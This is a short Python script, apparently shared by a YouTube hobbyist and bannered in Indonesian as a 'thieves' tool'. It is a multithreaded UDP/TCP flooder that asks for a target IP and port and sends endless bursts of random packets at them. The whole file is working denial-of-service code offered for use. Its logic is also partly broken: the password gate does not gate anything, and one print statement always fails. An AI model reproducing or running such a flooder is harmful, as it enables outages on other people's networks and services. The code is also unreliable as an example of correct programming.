import random
import socket
import threading
import os,sys
import time

password = input("[•] Account :")
time.sleep(2)
if password=="XXBR":
  print("[✓] Akun  Berhasil Masuk")
  time.sleep(2)
os.system("clear")
print ('''\033[95m
▒█▀▀█ ▒█▀▀▀█ ▒█▀▀█ ▒█░░░ ▒█▀▀▀█ ▒█░▄▀ 
▒█░▄▄ ▒█░░▒█ ▒█▀▀▄ ▒█░░░ ▒█░░▒█ ▒█▀▄░ 
▒█▄▄█ ▒█▄▄▄█ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄█ ▒█░▒█''')
print("凸 ( ͡❛ ͜ʖ ͡❛)凸")
print("☣  WELCOME PENCURI TOOLS")
print("☣  KALAU TEMBUS DIAM-DIAM SAJA MEK")
print("☣  JANGAN LUPA SUBS YT GW")
print("☣  YOUTUBE : XXBR")
ip = str(input("\033[91mIp:"))
port = int(input("\033[91mPort:"))
choice = str(input("\033[91mMetode UDP/TCP:"))
times = int(input("\033[91mPacket:"))
threads = int(input("\033[91mBarang:"))
os.system("clear")
def udp():
	data = random._urandom(1811)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(+"\033[91m ☣ Tembus Gak Ip \033[94m%s\033[91m Tembus Dong Port \033[94m%s"%(ip,port))
		except:
			print("\033[91m ☣ Tembus Gak Ip \033[94m%s\033[91m Tembus Dong Port \033[94m%s"%(ip,port))

def tcp():
	data = random._urandom(102400)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
		except:
			s.close()
			print("\033[91m ☣ Tembus gak Ip \033[94m%s \033[91m Tembus dong %s"%(ip,port))

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = udp)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = tcp)
        th.start()
else:
	print("\033[1;31;40m[!] Wrong Password!")
